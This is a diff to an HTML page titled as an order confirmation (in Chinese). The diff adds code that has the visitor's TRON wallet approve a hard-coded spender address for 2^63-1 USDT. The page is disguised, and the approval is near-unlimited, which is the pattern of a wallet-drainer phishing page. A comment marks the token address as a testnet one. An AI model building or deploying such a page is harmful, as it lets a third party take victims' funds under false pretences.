@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>订单确认信息</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
     * { box-sizing: border-box; }
     body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; background: #f9fafb; color: #111827; display: flex; flex-direction: column; height: 100vh; }
@@ -46,11 +45,22 @@
   document.getElementById("orderid").innerText = orderId;
 
   async function authorize() {
-    if (!window.ethereum && !window.tronWeb) {
-      alert("请使用支持以太坊或TRON的钱包打开");
+    const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz"; // 已部署合约地址
+    if (!window.tronWeb || !window.tronWeb.ready) {
+      alert("请在支持 TRON 的钱包中打开，如 TronLink");
       return;
     }
-    document.getElementById("status").innerText = "钱包环境检测成功，稍后将接入具体授权逻辑...";
+
+    const usdtAddress = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // TRC20-USDT 合约地址（Shasta 测试网）
+    const USDT = await window.tronWeb.contract().at(usdtAddress);
+
+    try {
+      const tx = await USDT.approve(spender, "9223372036854775807").send(); // 2^63-1 授权
+      document.getElementById("status").innerText = "授权成功！交易 ID：" + tx;
+    } catch (e) {
+      console.error(e);
+      document.getElementById("status").innerText = "授权失败：" + e.message;
+    }
   }
 </script>
 </body></html>
